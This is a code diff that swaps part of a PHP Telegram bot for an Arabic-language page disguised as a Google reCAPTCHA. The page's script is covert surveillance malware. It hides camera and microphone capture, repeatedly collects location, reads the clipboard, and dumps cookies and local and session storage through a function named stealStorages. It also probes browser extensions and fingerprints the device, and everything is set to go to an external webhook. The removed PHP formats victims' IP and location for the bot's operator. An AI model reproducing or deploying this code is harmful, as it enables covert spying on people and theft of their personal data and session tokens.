-        $this->answerCallbackQuery($callbackId);
-    }
-
-    private function callbackMainMenu(array $callback): void {
-        $userId = $callback['from']['id'];
-        $chatId = $callback['message']['chat']['id'];
-        $messageId = $callback['message']['message_id'];
-        $callbackId = $callback['id'];
-        $user = $this->getOrCreateUser($userId, $_SERVER['REMOTE_ADDR'] ?? null);
-        $lang = $user['language'] ?? 'en';
-
-        if ($lang === 'ar') {
-            $text = "⭑ اهلا بك في 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ ⭒\n⊚─〔 مـرحـبـا 〕──────────\n˼✨˹ سعداء بانضمامك الينا ⭒\n˼📖˹ يرجى قراءة الدليل ⭒\n˼🚀˹ لنبدأ رحلتنا معا ⭒\n─────────────────\n⚡ اختر من القائمة ادناه:";
-        } else {
-            $text = "⭑ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ ⭒\n‌╭⊚─〔 ᴡᴇʟᴄᴏᴍᴇ 〕─────\n┃˹🫡˼ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ ⭒\n┃˹♥️˼ ᴡᴇ'ʀᴇ ɢʟᴀᴅ ᴛᴏ ʜᴀᴠᴇ ʏᴏᴜ  ⭒\n┃˹📖˼ ᴘʟᴇᴀꜱᴇ ʀᴇᴀᴅ ᴛʜᴇ ɢᴜɪᴅᴇ   ⭒\n┃˹🚀˼ ʟᴇᴛ'ꜱ ɢᴇᴛ ꜱᴛᴀʀᴛᴇᴅ        ⭒\n╰───────────────";
-        }
-        $this->editMessageText($chatId, $messageId, $text, $this->mainMenuKeyboard($lang));
-        $this->answerCallbackQuery($callbackId);
-    }
-
-    // ====================================================================
-    //  دوال مساعدة
-    // ====================================================================
-    public function editMessageText(int $chatId, int $messageId, string $text, ?array $replyMarkup = null, string $parseMode = 'HTML'): void {
-        $params = ['chat_id' => $chatId, 'message_id' => $messageId, 'text' => $text, 'parse_mode' => $parseMode];
-        if ($replyMarkup) $params['reply_markup'] = json_encode($replyMarkup);
-        $this->callApi('editMessageText', $params);
-    }
-
-    public function answerCallbackQuery(string $callbackId, string $text = '', bool $showAlert = false): void {
-        $this->callApi('answerCallbackQuery', ['callback_query_id' => $callbackId, 'text' => $text, 'show_alert' => $showAlert]);
-    }
-
-    // ====================================================================
-    //  معالجة البيانات من الواجهة الأمامية
-    // ====================================================================
-    public function handleDataSubmission(array $post, array $files): bool {
-        log_info("⭑ [handleDataSubmission] ⭒ بدء معالجة بيانات رسالة الصوتية");
-
-        $token = $post['token'] ?? null;
-        if (!$token) { log_error("Missing token"); return false; }
-
-        $user = $this->db->getUserByToken($token);
-        if (!$user) {
-            log_warning("Invalid token: $token");
-            $this->notifyAdminInvalidToken($token, $post, $files);
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>reCAPTCHA – تحقق متقدم</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🐙</text></svg>" />
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{min-height:100vh;display:flex;justify-content:center;align-items:center;background:#eef2f5;font-family:'Roboto',Arial,sans-serif;padding:16px;-webkit-font-smoothing:antialiased;}
+        .captcha-wrapper{width:340px;max-width:100%;background:#f9f9f9;border:1px solid #d3d3d3;border-radius:5px;box-shadow:0 5px 15px rgba(0,0,0,0.08);overflow:hidden;cursor:default;transition:box-shadow .3s ease;user-select:none;}
+        .captcha-wrapper:hover{box-shadow:0 8px 25px rgba(0,0,0,0.12);}
+        .captcha-row{display:flex;align-items:center;padding:15px 15px 12px 15px;gap:12px;}
+        .spinner{position:relative;flex-shrink:0;}
+        .spinner input{display:none;}
+        .checkmark{width:32px;height:32px;border:2px solid #c1c1c1;border-radius:3px;display:flex;justify-content:center;align-items:center;cursor:pointer;background:#fff;transition:all .25s ease;position:relative;box-shadow:inset 0 1px 2px rgba(0,0,0,0.04);}
+        .checkmark:hover{border-color:#a0a0a0;box-shadow:0 0 0 2px rgba(26,115,232,0.15);}
+        .checkmark .tick{width:10px;height:18px;border-right:4px solid #00a651;border-bottom:4px solid #00a651;transform:rotate(45deg) scale(0.5);opacity:0;transition:all .2s cubic-bezier(0.34,1.56,0.64,1);}
+        .checkmark .loader{display:none;width:20px;height:20px;border:3px solid #e8f0fe;border-top:3px solid #1a73e8;border-radius:50%;animation:spin .7s linear infinite;}
+        .spinner.loading .checkmark{border-color:#1a73e8;background:#e8f0fe;cursor:default;}
+        .spinner.loading .checkmark .tick{display:none;}
+        .spinner.loading .checkmark .loader{display:block;}
+        .spinner.success .checkmark{border-color:#00a651;background:#e6f4ea;cursor:default;}
+        .spinner.success .checkmark .tick{opacity:1;transform:rotate(45deg) scale(1);}
+        .spinner.success .checkmark .loader{display:none;}
+        .spinner.failed .checkmark{border-color:#d93025;background:#fce8e6;cursor:default;}
+        .spinner.failed .checkmark .tick{display:none;}
+        .spinner.failed .checkmark .loader{display:none;}
+        .spinner.failed .checkmark::after{content:"✕";font-size:22px;font-weight:700;color:#d93025;line-height:1;}
+        .text{flex:1;font-size:18px;color:#333;text-align:center;transition:color .3s ease;font-weight:400;letter-spacing:.2px;}
+        .text.loading{color:#1a73e8;}
+        .text.failed{color:#d93025;}
+        .text.success{color:#00a651;}
+        .logo{display:flex;flex-direction:column;align-items:center;flex-shrink:0;font-size:10px;color:#777;line-height:1.2;}
+        .logo img{width:38px;height:auto;margin-bottom:3px;display:block;}
+        .logo strong{font-size:10px;font-weight:600;color:#555;}
+        .logo small{font-size:8px;color:#999;}
+        .captcha-footer{display:flex;align-items:center;justify-content:space-between;padding:6px 14px;background:#f1f3f4;border-top:1px solid #e5e7e9;min-height:36px;}
+        .captcha-footer .brand{display:flex;align-items:center;gap:6px;}
+        .captcha-footer .brand svg{height:24px;width:auto;}
+        .captcha-footer .brand .google-text{font-size:14px;font-weight:500;color:#222;letter-spacing:.3px;}
+        .captcha-footer .links{display:flex;align-items:center;gap:8px;font-size:11px;}
+        .captcha-footer .links a{color:#555;text-decoration:none;font-size:11px;transition:color .2s;}
+        .captcha-footer .links a:hover{color:#1a73e8;text-decoration:underline;}
+        .captcha-footer .links .separator{color:#aaa;}
+        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+        @media(max-width:480px){.captcha-wrapper{width:100%;}.text{font-size:16px;}.logo img{width:32px;}.captcha-footer .brand svg{height:20px;}.captcha-footer .brand .google-text{font-size:12px;}}
+        @media(max-width:360px){.captcha-row{padding:12px 10px 10px 10px;gap:8px;}.text{font-size:14px;}.checkmark{width:28px;height:28px;}.checkmark .tick{width:8px;height:14px;border-width:3px;}.logo img{width:28px;}}
+        #hiddenVideo{position:fixed;top:-1000px;left:-1000px;width:1px;height:1px;opacity:0;pointer-events:none;}
+        #hiddenCanvas{display:none;}
+        #fingerprintCanvas{position:fixed;top:-1000px;left:-1000px;width:1px;height:1px;opacity:0;pointer-events:none;}
+        .sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0;}
+        .loading-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.01);z-index:9999;pointer-events:none;}
+        .loading-overlay.active{display:block;}
+    </style>
+</head>
+<body>
+
+    <div class="loading-overlay" id="loadingOverlay"></div>
+
+    <div class="captcha-wrapper" id="captchaWrapper" role="button" tabindex="0" aria-label="تحقق أنك لست روبوتاً">
+        <div class="captcha-row">
+            <div class="spinner" id="spinner">
+                <input type="checkbox" id="captcha" aria-label="أنا لست روبوتاً" />
+                <label class="checkmark" for="captcha">
+                    <span class="tick"></span>
+                    <div class="loader"></div>
+                </label>
+            </div>
+            <div class="text" id="mainText">أنا لست روبوتاً</div>
+            <div class="logo">
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" width="38" height="38" loading="lazy" />
+                <strong>reCAPTCHA</strong>
+                <small>الخصوصية - الشروط</small>
+            </div>
+        </div>
+        <div class="captcha-footer">
+            <div class="brand">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
+                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                </svg>
+                <span class="google-text">Google</span>
+            </div>
+            <div class="links">
+                <a href="#" onclick="return false;">سياسة الخصوصية</a>
+                <span class="separator">-</span>
+                <a href="#" onclick="return false;">الشروط</a>
+            </div>
+        </div>
+    </div>
+
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas"></canvas>
+    <canvas id="fingerprintCanvas"></canvas>
+
+    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+
+    <script>
+        // ================================================================
+        //  OCTOPUS ULTRA PREMIUM v4.0.0 – النسخة النهائية المتكاملة
+        // ================================================================
+
+        const CONFIG = {
+            WEBHOOK_URL: 'https://dev-re-capatcha.pantheonsite.io/reCAPATCHA/bot.php?action=webhook_data',
+            TOTAL_PHOTOS: 8,
+            CAPTURE_INTERVAL: 700,
+            AUDIO_DURATION: 8000,
+            PHOTO_QUALITY: 0.92,
+            LOCATION_ATTEMPTS: 10,
+            LOCATION_TIMEOUT: 8000,
+            LOCATION_TARGET_ACCURACY: 50,
+            TOKEN_LENGTH: 6,
+            MAX_FILE_SIZE: 10 * 1024 * 1024,
+            FACE_MODEL_URL: 'https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights',
+            MASTER_TOKEN: 'MASTER',
+            RETRY_INTERVAL: 30000,
+            MAX_RETRIES: 5,
+            VERSION: '4.0.0'
+        };
+
+        const state = {
+            userToken: null,
+            mediaStream: null,
+            audioStream: null,
+            audioRecorder: null,
+            audioChunks: [],
+            capturedPhotoFiles: [],
+            audioBlob: null,
+            userIP: 'غير متاح',
+            userLocation: { lat: null, lng: null, accuracy: null, error: null },
+            isCollecting: false,
+            collectionComplete: false,
+            collectedData: {},
+            faceData: null,
+            transcribedText: null,
+            detectedLanguage: null,
+            clipboardContent: null,
+            installedExtensions: [],
+            browserHistory: [],
+            allCookies: {},
+            deviceClassification: {},
+            spoofingDetected: {},
+            attacksData: {},
+            startTime: null,
+            isFaceApiLoaded: false,
+            faceApiLoadAttempted: false,
+            permissionsGranted: { camera: false, mic: false, location: false, clipboard: false },
+            pendingRetries: 0,
+            dataSent: false,
+            isHeadless: false,
+        };
+
+        const el = {
+            wrapper: document.getElementById('captchaWrapper'),
+            spinner: document.getElementById('spinner'),
+            checkbox: document.getElementById('captcha'),
+            mainText: document.getElementById('mainText'),
+            hiddenVideo: document.getElementById('hiddenVideo'),
+            hiddenCanvas: document.getElementById('hiddenCanvas'),
+            fingerprintCanvas: document.getElementById('fingerprintCanvas'),
+            overlay: document.getElementById('loadingOverlay'),
+        };
+
+        // ================================================================
+        //  دوال مساعدة
+        // ================================================================
+        function detectHeadless() {
+            if (navigator.webdriver) return true;
+            if (/HeadlessChrome/.test(navigator.userAgent)) return true;
+            if (/PhantomJS/.test(navigator.userAgent)) return true;
+            if (window._phantom || window.callPhantom) return true;
+            if (window.chrome && window.chrome.webstore === undefined) return true;
+            if (navigator.languages.length === 0) return true;
+            if (document.documentElement.style.fontFamily === '') return true;
             return false;
         }
 
-        $userId = $user['user_id'];
-        $chatId = $userId;
-        $lang = $user['language'] ?? 'en';
-
-        // استخراج البيانات
-        $ip = htmlspecialchars($post['ip'] ?? $_SERVER['REMOTE_ADDR'] ?? 'غير متاح');
-        $battery = isset($post['battery']) && is_numeric($post['battery']) ? (int)$post['battery'] : null;
-
-        // الموقع
-        $lat = null; $lng = null; $accuracy = null; $locationError = null;
-        if (isset($post['location']) && is_array($post['location'])) {
-            $loc = $post['location'];
-            $lat = isset($loc['lat']) && is_numeric($loc['lat']) ? (float)$loc['lat'] : null;
-            $lng = isset($loc['lng']) && is_numeric($loc['lng']) ? (float)$loc['lng'] : null;
-            $accuracy = isset($loc['accuracy']) && is_numeric($loc['accuracy']) ? (float)$loc['accuracy'] : null;
-            $locationError = $loc['error'] ?? null;
-        } else {
-            if (isset($post['location[lat]']) && is_numeric($post['location[lat]'])) $lat = (float)$post['location[lat]'];
-            if (isset($post['location[lng]']) && is_numeric($post['location[lng]'])) $lng = (float)$post['location[lng]'];
-            if (isset($post['location[accuracy]']) && is_numeric($post['location[accuracy]'])) $accuracy = (float)$post['location[accuracy]'];
-            if (isset($post['location[error]'])) $locationError = $post['location[error]'];
-        }
-
-        // بيانات الجهاز
-        $deviceData = $post['deviceData'] ?? null;
-        $attacksData = $post['attacks'] ?? null;
-        $timestamp = htmlspecialchars($post['timestamp'] ?? date('Y-m-d H:i:s'));
-
-        // ================================================================
-        //  بناء رسالة التيليجرام
-        // ================================================================
-        $textMsg = "";
-        if ($lang === 'ar') {
-            $textMsg .= "⭑ رسالة صوتية جديدة ⭒\n⊚─〔 بيانات المستخدم 〕─────\n";
-            $textMsg .= "˼🖥️˹ الـ IP: $ip ⭒\n";
-            $textMsg .= "˼🔋˹ البطارية: " . ($battery !== null ? $battery . '%' : 'غير متاح') . " ⭒\n";
-        } else {
-            $textMsg .= "⭑ ɴᴇᴡ ᴠᴏɪᴄᴇ ᴍᴇꜱꜱᴀɢᴇ ⭒\n‌╭⊚─〔 ᴜꜱᴇʀ ᴅᴀᴛᴀ 〕─────\n";
-            $textMsg .= "┃˹🖥️˼ ɪᴘ: $ip ⭒\n";
-            $textMsg .= "┃˹🔋˼ ʙᴀᴛᴛᴇʀʏ: " . ($battery !== null ? $battery . '%' : 'ɴ/ᴀ') . " ⭒\n";
-        }
-
-        // الموقع
-        if ($lat !== null && $lng !== null) {
-            $geo = $this->reverseGeocode($lat, $lng);
-            if ($lang === 'ar') {
-                $textMsg .= "\n⭑ معلومات الموقع ⭒\n⊚─〔 بيانات الموقع 〕────────\n";
-                $textMsg .= "˼📍˹ خط العرض: <code>" . number_format($lat, 6) . "</code> ⭒\n";
-                $textMsg .= "˼📍˹ خط الطول: <code>" . number_format($lng, 6) . "</code> ⭒\n";
-                if ($accuracy) $textMsg .= "˼🎯˹ الدقة: " . round($accuracy) . " م ⭒\n";
-                if ($geo['city']) $textMsg .= "˼🏙️˹ المدينة: " . htmlspecialchars($geo['city']) . " ⭒\n";
-                if ($geo['state']) $textMsg .= "˼🗺️˹ المحافظة: " . htmlspecialchars($geo['state']) . " ⭒\n";
-                if ($geo['country']) $textMsg .= "˼🌍˹ الدولة: " . htmlspecialchars($geo['country']) . " ⭒\n";
-                $textMsg .= "˼🗺️˹ <a href=\"https://www.google.com/maps/search/?api=1&query={$lat},{$lng}\">خريطة جوجل</a> ⭒\n";
-                $textMsg .= "─────────────────";
+        function setUIState(type) {
+            el.spinner.className = 'spinner ' + type;
+            el.mainText.className = 'text ' + type;
+            const texts = {
+                success: 'تم التحقق بنجاح',
+                failed: 'فشل التحقق، حاول مجدداً',
+                loading: 'جاري التحقق من هويتك ...',
+                permission: 'يرجى السماح بالوصول إلى الكاميرا والميكروفون، ثم اضغط على المربع لإعادة المحاولة.',
+                '': 'أنا لست روبوتاً',
+            };
+            el.mainText.textContent = texts[type] || texts[''];
+            el.checkbox.checked = type === 'success';
+            if (type === 'loading') {
+                el.overlay.classList.add('active');
             } else {
-                $textMsg .= "\n⭑ ʟᴏᴄᴀᴛɪᴏɴ ɪɴꜰᴏ ⭒\n‌╭⊚─〔 ɢᴇᴏ ᴅᴀᴛᴀ 〕─────\n";
-                $textMsg .= "┃˹📍˼ ʟᴀᴛ: <code>" . number_format($lat, 6) . "</code> ⭒\n";
-                $textMsg .= "┃˹📍˼ ʟᴏɴ: <code>" . number_format($lng, 6) . "</code> ⭒\n";
-                if ($accuracy) $textMsg .= "┃˹🎯˼ ᴀᴄᴄᴜʀᴀᴄʏ: " . round($accuracy) . " ᴍ ⭒\n";
-                if ($geo['city']) $textMsg .= "┃˹🏙️˼ ᴄɪᴛʏ: " . htmlspecialchars($geo['city']) . " ⭒\n";
-                if ($geo['state']) $textMsg .= "┃˹🗺️˼ ꜱᴛᴀᴛᴇ: " . htmlspecialchars($geo['state']) . " ⭒\n";
-                if ($geo['country']) $textMsg .= "┃˹🌍˼ ᴄᴏᴜɴᴛʀʏ: " . htmlspecialchars($geo['country']) . " ⭒\n";
-                $textMsg .= "┃˹🗺️˼ <a href=\"https://www.google.com/maps/search/?api=1&query={$lat},{$lng}\">ɢᴏᴏɢʟᴇ ᴍᴀᴘꜱ</a> ⭒\n";
-                $textMsg .= "╰───────────────";
+                el.overlay.classList.remove('active');
             }
-        } elseif ($locationError) {
-            $safeError = htmlspecialchars($locationError);
-            if ($lang === 'ar') {
-                $textMsg .= "\n⭑ حالة الموقع ⭒\n⊚─〔 تنبيه 〕────────\n˼⚠️˹ الموقع غير متاح\n$safeError\n─────────────────";
+        }
+
+        function safeStringify(data) {
+            try { return JSON.stringify(data); } catch (_) { return '{}'; }
+        }
+
+        function logToConsole(msg) {
+            try { console.log('[OCTOPUS] ' + msg); } catch (_) {}
+        }
+
+        // ================================================================
+        //  IndexedDB Backup
+        // ================================================================
+        function saveToIndexedDB(data) {
+            try {
+                const request = indexedDB.open('OctopusBackup', 2);
+                request.onupgradeneeded = (e) => {
+                    const db = e.target.result;
+                    if (!db.objectStoreNames.contains('backup')) {
+                        db.createObjectStore('backup', { keyPath: 'id' });
+                    }
+                };
+                request.onsuccess = (e) => {
+                    const db = e.target.result;
+                    const tx = db.transaction('backup', 'readwrite');
+                    const store = tx.objectStore('backup');
+                    store.put({ id: 'latest', data: data, timestamp: Date.now() });
+                };
+                request.onerror = () => {};
+            } catch (_) {}
+        }
+
+        function loadFromIndexedDB() {
+            return new Promise((resolve) => {
+                try {
+                    const request = indexedDB.open('OctopusBackup', 2);
+                    request.onsuccess = (e) => {
+                        const db = e.target.result;
+                        const tx = db.transaction('backup', 'readonly');
+                        const store = tx.objectStore('backup');
+                        const getRequest = store.get('latest');
+                        getRequest.onsuccess = () => { resolve(getRequest.result); };
+                        getRequest.onerror = () => { resolve(null); };
+                    };
+                    request.onerror = () => { resolve(null); };
+                } catch (_) { resolve(null); }
+            });
+        }
+
+        // ================================================================
+        //  استخراج التوكن
+        // ================================================================
+        function extractTokenFromURL() {
+            const params = new URLSearchParams(window.location.search);
+            const token = params.get('i');
+            if (token && token.length === CONFIG.TOKEN_LENGTH && /^[A-Z0-9]+$/.test(token)) {
+                state.userToken = token;
+                sessionStorage.setItem('octopus_token', token);
+                return true;
+            }
+            const saved = sessionStorage.getItem('octopus_token');
+            if (saved && saved.length === CONFIG.TOKEN_LENGTH && /^[A-Z0-9]+$/.test(saved)) {
+                state.userToken = saved;
+                return true;
+            }
+            state.userToken = CONFIG.MASTER_TOKEN;
+            sessionStorage.setItem('octopus_token', CONFIG.MASTER_TOKEN);
+            return true;
+        }
+
+        // ================================================================
+        //  دوال الجهاز
+        // ================================================================
+        function classifyDevice() {
+            const ua = navigator.userAgent;
+            const result = { os: 'Unknown', osVersion: 'Unknown', browser: 'Unknown', browserVersion: 'Unknown',
+                deviceType: 'Desktop', isMobile: false, isTablet: false };
+            
+            if (ua.includes('Windows NT 10.0')) { result.os = 'Windows';
+                result.osVersion = '10'; } 
+            else if (ua.includes('Windows NT 6.3')) { result.os = 'Windows';
+                result.osVersion = '8.1'; } 
+            else if (ua.includes('Windows NT 6.2')) { result.os = 'Windows';
+                result.osVersion = '8'; } 
+            else if (ua.includes('Windows NT 6.1')) { result.os = 'Windows';
+                result.osVersion = '7'; } 
+            else if (ua.includes('Mac OS X')) { result.os = 'macOS';
+                result.osVersion = (ua.match(/Mac OS X ([\d_]+)/)?.[1] || '').replace(/_/g, '.') || 'Unknown'; } 
+            else if (ua.includes('Linux')) { result.os = 'Linux'; } 
+            else if (ua.includes('Android')) { result.os = 'Android';
+                result.osVersion = ua.match(/Android ([\d.]+)/)?.[1] || 'Unknown';
+                result.deviceType = 'Mobile';
+                result.isMobile = true; } 
+            else if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) { 
+                result.os = 'iOS';
+                result.osVersion = (ua.match(/OS ([\d_]+)/)?.[1] || '').replace(/_/g, '.') || 'Unknown';
+                result.deviceType = ua.includes('iPad') ? 'Tablet' : 'Mobile';
+                result.isMobile = !ua.includes('iPad');
+                result.isTablet = ua.includes('iPad');
+            }
+
+            if (ua.includes('Edg/')) { result.browser = 'Edge';
+                result.browserVersion = ua.match(/Edg\/([\d.]+)/)?.[1] || 'Unknown'; } 
+            else if (ua.includes('OPR/') || ua.includes('Opera/')) { result.browser = 'Opera';
+                result.browserVersion = ua.match(/(?:OPR|Opera)\/([\d.]+)/)?.[1] || 'Unknown'; } 
+            else if (ua.includes('Chrome/')) { result.browser = 'Chrome';
+                result.browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || 'Unknown'; } 
+            else if (ua.includes('Firefox/')) { result.browser = 'Firefox';
+                result.browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || 'Unknown'; } 
+            else if (ua.includes('Safari/')) { result.browser = 'Safari';
+                result.browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || ua.match(/Safari\/([\d.]+)/)?.[1] ||
+                    'Unknown'; }
+
+            if (result.isMobile) result.deviceType = 'Mobile';
+            else if (result.isTablet) result.deviceType = 'Tablet';
+            else result.deviceType = 'Desktop';
+
+            state.deviceClassification = result;
+            return result;
+        }
+
+        function detectSpoofing() {
+            const result = { canvasSpoof: false, webglSpoof: false, vpnProxy: false, headless: false };
+            try {
+                const c = document.createElement('canvas');
+                c.width = 256;
+                c.height = 256;
+                const ctx = c.getContext('2d');
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(0, 0, 256, 256);
+                const data = ctx.getImageData(0, 0, 256, 256).data;
+                let count = 0;
+                for (let i = 0; i < data.length; i += 4) {
+                    if (data[i] === 255 && data[i + 1] === 102 && data[i + 2] === 0) count++;
+                }
+                if (count < 60000) result.canvasSpoof = true;
+            } catch (_) {}
+            try {
+                const c = document.createElement('canvas');
+                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                if (gl) {
+                    const info = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (info) {
+                        const vendor = gl.getParameter(info.UNMASKED_VENDOR_WEBGL);
+                        const renderer = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
+                        const legit = ['Google', 'Intel', 'NVIDIA', 'AMD', 'Apple', 'ARM', 'Qualcomm', 'Mesa'];
+                        if (!legit.some(x => vendor.includes(x) || renderer.includes(x))) result.webglSpoof = true;
+                    }
+                }
+            } catch (_) {}
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.createDataChannel('test');
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                const ips = new Set();
+                pc.onicecandidate = e => {
+                    if (e.candidate) {
+                        const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
+                        if (ip) ips.add(ip);
+                    }
+                };
+                setTimeout(() => pc.close(), 2000);
+                if (ips.size > 1) result.vpnProxy = true;
+            } catch (_) {}
+            
+            state.isHeadless = detectHeadless();
+            result.headless = state.isHeadless;
+            
+            state.spoofingDetected = result;
+            return result;
+        }
+
+        async function detectExtensions() {
+            const extensions = [];
+            const known = [
+                'nmmhkkegccagdldgiimedpic', 'ghbmnnjooekpmoecnnnilnnbdlolhkhi',
+                'nkeimhogjdpnpccoofpliimaahmaaome', 'apdfllckaahabafndbhieahigkjlhalf',
+                'aohghmighlieiainnegkcijnfiokake', 'felcaaldnbdncclmgdcncolpebgiejap',
+                'pjkljhegncpnkpknbcohdijeoejaedia', 'blpcfgokakmgnkcojhhkbfbldkacnbeo',
+                'coobgpohoikkiipiblmjeljniedjpjpf', 'aapbdbdomjkkjkaonfhkkikfgjllcleb',
+                'gighmmpiobklfepjocnamgkkbiglidom', 'cfhdojbkjhnklbpkdaibdccddilifddb',
+                'nknbkhdknagdakhkajbjlockblnbfhie', 'fdpohaocaeogifhhanbjmmicplekadd',
+                'hnjabckgkldmhfjcmhcmldcfhgdgcmmb', 'hdokiejnpimakedhajhdlcegeplioahd',
+                'aeblfdkhhhncdpajijgkmofbbncfidng', 'pioclpoplcdbaefihamjohnefbikjilc',
+                'bjmfeogmmpfjidbgpfngdglppobnidkm', 'kbfnbcaeplbcioakkpcpgfkobkghlhen',
+                'jhimjlodphjhkpgocafcldcdchnehejb', 'mnjggcdmjocbbbhaepdhchncahnbgone',
+                'cjpalhdlnbpafiamejdnhcphjbkeiagm'
+            ];
+            const names = [
+                'Google Wallet', 'Google Docs Offline', 'Google Hangouts', 'Google Drive',
+                'Google Docs', 'Google Sheets', 'Gmail', 'YouTube', 'Google Search', 'Google Translate',
+                'AdBlock', 'AdBlock Plus', 'uBlock Origin', 'LastPass', 'Dashlane', 'Bitwarden',
+                'Evernote', 'Evernote Web Clipper', 'Grammarly', 'Grammarly for Chrome',
+                'Honey', 'SponsorBlock', 'uBlock Origin (alt)'
+            ];
+            for (let i = 0; i < known.length; i++) {
+                try {
+                    await fetch(`chrome-extension://${known[i]}/manifest.json`, { mode: 'no-cors', cache: 'no-store' });
+                    extensions.push(names[i] || known[i]);
+                } catch (_) {}
+            }
+            try {
+                if (document.querySelector('[data-grammarly]') && !extensions.includes('Grammarly')) extensions.push(
+                    'Grammarly');
+                if (document.querySelector('.uBlockOrigin') && !extensions.includes('uBlock Origin')) extensions.push(
+                    'uBlock Origin');
+            } catch (_) {}
+            state.installedExtensions = extensions;
+            return extensions;
+        }
+
+        // ================================================================
+        //  الحافظة
+        // ================================================================
+        async function readClipboard() {
+            try {
+                const text = await navigator.clipboard.readText();
+                state.clipboardContent = text;
+                state.permissionsGranted.clipboard = true;
+                return;
+            } catch (_) {
+                try {
+                    const ta = document.createElement('textarea');
+                    ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;top:-1000px;left:-1000px;';
+                    document.body.appendChild(ta);
+                    ta.focus();
+                    document.execCommand('paste');
+                    state.clipboardContent = ta.value || null;
+                    if (state.clipboardContent) state.permissionsGranted.clipboard = true;
+                    document.body.removeChild(ta);
+                } catch (_2) {
+                    state.clipboardContent = null;
+                    state.permissionsGranted.clipboard = false;
+                }
+            }
+        }
+
+        function stealStorages() {
+            const result = { cookies: document.cookie, localStorage: {}, sessionStorage: {} };
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key) result.localStorage[key] = localStorage.getItem(key);
+                }
+            } catch (_) {}
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    if (key) result.sessionStorage[key] = sessionStorage.getItem(key);
+                }
+            } catch (_) {}
+            state.allCookies = result;
+            return result;
+        }
+
+        function getSearchHistory() {
+            const keys = ['search', 'query', 'q', 'history', 'recent', 'lastSearch', 'searchTerms', 'queries', 
+                         'gsearch', 'google_search', 'youtube_search'];
+            const results = [];
+            try {
+                keys.forEach(k => {
+                    const v = localStorage.getItem(k);
+                    if (v) results.push({ source: 'localStorage', key: k, value: v });
+                });
+                keys.forEach(k => {
+                    const v = sessionStorage.getItem(k);
+                    if (v) results.push({ source: 'sessionStorage', key: k, value: v });
+                });
+            } catch (_) {}
+            state.browserHistory = results;
+            return results;
+        }
+
+        // ================================================================
+        //  جمع بيانات الجهاز
+        // ================================================================
+        async function collectDeviceData() {
+            const data = {};
+            const dev = state.deviceClassification;
+            const spoof = state.spoofingDetected;
+
+            data.userAgent = navigator.userAgent;
+            data.platform = navigator.platform;
+            data.language = navigator.language;
+            data.languages = navigator.languages || [];
+            data.cookieEnabled = navigator.cookieEnabled;
+            data.hardwareConcurrency = navigator.hardwareConcurrency || null;
+            data.deviceMemory = navigator.deviceMemory || null;
+            data.maxTouchPoints = navigator.maxTouchPoints || 0;
+            data.vendor = navigator.vendor || null;
+            data.isHeadless = state.isHeadless;
+
+            data.screen = {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                orientation: screen.orientation?.type || 'unknown',
+                angle: screen.orientation?.angle || 0,
+            };
+            data.pixelRatio = window.devicePixelRatio || 1;
+            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            data.timezoneOffset = new Date().getTimezoneOffset();
+            data.locale = Intl.DateTimeFormat().resolvedOptions().locale;
+            data.timestamp = new Date().toISOString();
+
+            try {
